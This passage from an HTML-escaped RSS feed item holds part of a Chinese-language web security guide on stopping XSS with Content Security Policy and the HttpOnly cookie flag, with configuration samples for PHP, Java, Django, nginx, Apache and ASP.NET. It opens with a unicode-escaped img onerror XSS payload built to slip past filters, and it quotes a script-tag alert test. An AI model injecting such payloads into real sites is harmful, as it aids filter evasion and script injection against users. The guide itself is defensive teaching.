+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;csp内容安全允许策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csp内容安全允许策略&#34;&gt;#&lt;/a&gt; CSP (内容安全允许策略)&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;CSP（内容安全策略）的核心目标是防止跨站脚本攻击（XSS）及其变种&lt;/strong&gt;，它是通过&lt;strong&gt;严格控制网页中可以加载和执行的资源&lt;/strong&gt;来实现的纵深防御策略。&lt;/p&gt;
+&lt;h4 id=&#34;主要防御的攻击类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#主要防御的攻击类型&#34;&gt;#&lt;/a&gt; &lt;strong&gt;主要防御的攻击类型&lt;/strong&gt;&lt;/h4&gt;
+&lt;h5 id=&#34;xss跨站脚本攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss跨站脚本攻击&#34;&gt;#&lt;/a&gt; XSS（跨站脚本攻击）：&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;传统 XSS&lt;/strong&gt;：攻击者注入恶意脚本（如  &lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt; ）到网页中，当用户访问时执行。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;CSP 的防御方式&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;通过  &lt;code&gt;script-src&lt;/code&gt;  指令限制脚本来源（如只允许同域或可信 CDN）。&lt;/li&gt;
+&lt;li&gt;禁止内联脚本（如  &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;  标签或事件处理函数  &lt;code&gt;onclick=&amp;quot;...&amp;quot;&lt;/code&gt; ），除非显式启用  &lt;code&gt;&#39;unsafe-inline&#39;&lt;/code&gt; （不推荐）。&lt;/li&gt;
+&lt;li&gt;阻止  &lt;code&gt;eval()&lt;/code&gt; 、 &lt;code&gt;setTimeout(string)&lt;/code&gt;  等动态代码执行。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;数据注入攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据注入攻击&#34;&gt;#&lt;/a&gt; 数据注入攻击：&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;包括未授权的  &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt;  嵌入、恶意插件（ &lt;code&gt;&amp;lt;object&amp;gt;&lt;/code&gt; ）、伪造表单等。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;CSP 的防御方式&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;通过  &lt;code&gt;frame-src&lt;/code&gt;  限制嵌入框架的来源。&lt;/li&gt;
+&lt;li&gt;通过  &lt;code&gt;object-src&lt;/code&gt;  限制插件加载（如 Flash）。&lt;/li&gt;
+&lt;li&gt;通过  &lt;code&gt;form-action&lt;/code&gt;  限制表单提交的目标地址。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;资源劫持与数据泄露&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#资源劫持与数据泄露&#34;&gt;#&lt;/a&gt; 资源劫持与数据泄露：&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;攻击者通过恶意脚本窃取数据（如键盘记录、截屏）或劫持用户会话。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;CSP 的防御方式&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;通过  &lt;code&gt;connect-src&lt;/code&gt;  限制 AJAX/Fetch 请求的目标（防止数据外泄到攻击者服务器）。&lt;/li&gt;
+&lt;li&gt;通过  &lt;code&gt;img-src&lt;/code&gt;  限制图片来源（防止通过  &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt;  标签窃取数据）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;httponly&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#httponly&#34;&gt;#&lt;/a&gt; HttpOnly&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;httponly 是 Cookie 中的一个属性，可以用来防止客户端脚本通过 document.cookie 属性访问 Cookie&lt;/strong&gt;，保护 Cookie 不被跨站脚本攻击窃取或篡改&lt;/p&gt;
+&lt;p&gt;使用方法通用格式如下&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Set-Cookie: &amp;lt;cookie-name&amp;gt;=&amp;lt;cookie-value&amp;gt;; Path=/; Domain=example.com; Expires=&amp;lt;date&amp;gt;; Secure; HttpOnly&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h4 id=&#34;不同服务器端语言框架的示例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#不同服务器端语言框架的示例&#34;&gt;#&lt;/a&gt; 不同服务器端语言 / 框架的示例&lt;/h4&gt;
+&lt;h5 id=&#34;php&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php&#34;&gt;#&lt;/a&gt; PHP&lt;/h5&gt;
+&lt;p&gt;使用  &lt;code&gt;session_set_cookie_params&lt;/code&gt;  (在  &lt;code&gt;session_start()&lt;/code&gt;  之前调用) 为会话 Cookie 设置：&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;session_set_cookie_params([&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;lifetime&amp;#x27; =&amp;gt; 86400, // 生存期（秒）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;path&amp;#x27; =&amp;gt; &amp;#x27;/&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;domain&amp;#x27; =&amp;gt; &amp;#x27;example.com&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;secure&amp;#x27; =&amp;gt; true,    // 推荐在 HTTPS 站点启用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;httponly&amp;#x27; =&amp;gt; true   // 关键！开启 HttpOnly&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;session_start();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;使用  &lt;code&gt;setcookie&lt;/code&gt;  函数设置普通 Cookie&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;setcookie(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;MyCookie&amp;#x27;,         // Cookie 名称&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;cookie_value&amp;#x27;,     // Cookie 值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    time() + 3600,      // 过期时间（时间戳）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;/&amp;#x27;,                // 路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;example.com&amp;#x27;,      // 域名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    true,               // Secure (仅 HTTPS)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    true                // HttpOnly (关键！)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h5 id=&#34;java&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#java&#34;&gt;#&lt;/a&gt; java&lt;/h5&gt;
+&lt;p&gt;使用  &lt;code&gt;HttpServletResponse.addCookie&lt;/code&gt; ：&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie myCookie = new Cookie(&amp;quot;MyCookie&amp;quot;, &amp;quot;cookie_value&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;myCookie.setMaxAge(3600); // 秒&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;myCookie.setPath(&amp;quot;/&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;myCookie.setDomain(&amp;quot;example.com&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;myCookie.setSecure(true);  // 推荐在 HTTPS 站点启用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;myCookie.setHttpOnly(true); // 关键！开启 HttpOnly&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;response.addCookie(myCookie);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h5 id=&#34;python&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python&#34;&gt;#&lt;/a&gt; python&lt;/h5&gt;
+&lt;p&gt;Django 默认将会话 Cookie 和 CSRF Cookie 设置为  &lt;code&gt;HttpOnly&lt;/code&gt; 。如果需要手动设置&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;response = HttpResponse(&amp;quot;Setting cookie&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;response.set_cookie(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;MyCookie&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    value=&amp;#x27;cookie_value&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    max_age=3600,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    path=&amp;#x27;/&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    domain=&amp;#x27;example.com&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    secure=True,       # 推荐在 HTTPS 站点启用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    httponly=True      # 关键！开启 HttpOnly&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;return response&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;在  &lt;code&gt;settings.py&lt;/code&gt;  中配置会话 Cookie (默认已开启)：&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;SESSION_COOKIE_HTTPONLY = True  # 默认即为 True&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SESSION_COOKIE_SECURE = True    # 生产环境推荐设为 True&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h5 id=&#34;web-服务器配置-nginx-apache&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-服务器配置-nginx-apache&#34;&gt;#&lt;/a&gt; &lt;strong&gt;Web 服务器配置 (Nginx / Apache):&lt;/strong&gt;&lt;/h5&gt;
+&lt;p&gt;有时也可以在 Web 服务器层统一添加或修改 Cookie 属性（例如修改后端应用设置的 Cookie）&lt;/p&gt;
+&lt;h6 id=&#34;nginx&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nginx&#34;&gt;#&lt;/a&gt; nginx&lt;/h6&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# 修改通过代理传递的 Cookie (例如将后端设置的会话Cookie添加HttpOnly/Secure)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;location / &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    proxy_pass http://backend;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    proxy_cookie_path / &amp;quot;/; Secure; HttpOnly&amp;quot;; # 添加属性&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h6 id=&#34;apache2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apache2&#34;&gt;#&lt;/a&gt; apache2&lt;/h6&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# 为匹配的 Cookie 添加 HttpOnly 和 Secure 属性 (需谨慎)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Header edit Set-Cookie ^(.*)$ &amp;quot;$1; Secure; HttpOnly&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h5 id=&#34;aspnet-c&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#aspnet-c&#34;&gt;#&lt;/a&gt; &lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL0FTUC5ORVQ=&#34;&gt;ASP.NET&lt;/span&gt; (C#):&lt;/strong&gt;&lt;/h5&gt;
+&lt;p&gt;在  &lt;code&gt;web.config&lt;/code&gt;  中配置会话 Cookie：&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;system.web&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;httpCookies httpOnlyCookies=&amp;quot;true&amp;quot; requireSSL=&amp;quot;true&amp;quot; /&amp;gt; &amp;lt;!-- 全局设置 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;sessionState cookieHttpOnly=&amp;quot;true&amp;quot; /&amp;gt; &amp;lt;!-- 会话 Cookie --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/system.web&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h4 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h4&gt;
+&lt;p&gt;开启  &lt;code&gt;HttpOnly&lt;/code&gt;  就是在服务器端创建 Cookie 时（通过  &lt;code&gt;Set-Cookie&lt;/code&gt;  响应头），明确添加  &lt;code&gt;HttpOnly&lt;/code&gt;  标志。查看你使用的服务器端语言或框架的文档，找到设置 Cookie 属性的方法（通常是  &lt;code&gt;httpOnly&lt;/code&gt; ,  &lt;code&gt;httponly&lt;/code&gt; ,  &lt;code&gt;setHttpOnly&lt;/code&gt;  这样的参数），将其设置为  &lt;code&gt;true&lt;/code&gt;  即可。最后务必通过浏览器开发者工具验证设置是否成功&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;httponly&lt;/code&gt;  属性通过禁止 JavaScript 访问特定 Cookie，切断了恶意脚本（通常来自 XSS 攻击）窃取或篡改该 Cookie 的途径，从而有效地保护了 Cookie 中存储的敏感信息（尤其是会话令牌），防止了基于 Cookie 窃取的会话劫持攻击。它是 Web 应用安全纵深防御体系中一个简单而至关重要的环节&lt;/p&gt;
  ]]></description>
         </item>
         <item>
